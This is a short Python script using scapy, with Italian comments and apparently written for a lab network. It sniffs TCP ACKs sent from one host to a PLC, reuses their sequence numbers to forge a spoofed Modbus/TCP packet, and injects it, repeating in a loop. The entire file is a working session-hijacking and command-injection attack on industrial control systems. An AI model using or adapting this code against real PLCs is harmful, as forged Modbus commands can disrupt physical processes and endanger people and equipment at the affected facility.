from scapy.all import *
from scapy.layers.inet import *
from random import randint

from modbuspkt import Modbus, ModbusTCP

filter_rule = "src host 10.0.0.201 and dst host 10.0.0.22 and tcp[tcpflags]==tcp-ack"

while True:
    # cattura un tcp ack diretto verso il plc
    tcp_acks = sniff(iface="eth1", filter=filter_rule, count=1)
    tcp_ack = tcp_acks[0]
    
    print(" ----- TCP ACK ----- ")
    tcp_ack.show()

    # genera il pacchetto
    print("     forging packet")
    tcpdata = {
        'src': tcp_ack[IP].src,
        'dst': tcp_ack[IP].dst,
        'sport': tcp_ack[TCP].sport,
        'dport': tcp_ack[TCP].dport,
        'seq': tcp_ack[TCP].seq+1,
        'ack': tcp_ack[TCP].ack,
        'wnd': tcp_ack[TCP].window,
    }
    
    # genera un pacchetto modbus con seq e ack dell'ack catturato
    # e livelli modbustcp, modbus ottenuti da un altro python.
    payload = IP(src=tcpdata['src'], dst=tcpdata['dst']) / \
            	TCP(sport=tcpdata['sport'], dport=tcpdata['dport'], \
            	flags="PA", window=tcpdata['wnd'], seq=tcpdata['seq'], ack=tcpdata['ack'])            
    payload = payload/ModbusTCP()/Modbus()

    print("     displaying packet")
    payload.display()

    # inietta il pacchetto nella rete
    print("     injecting packet")
    send(payload, verbose=0, iface="eth1")
    print("     packet sent")
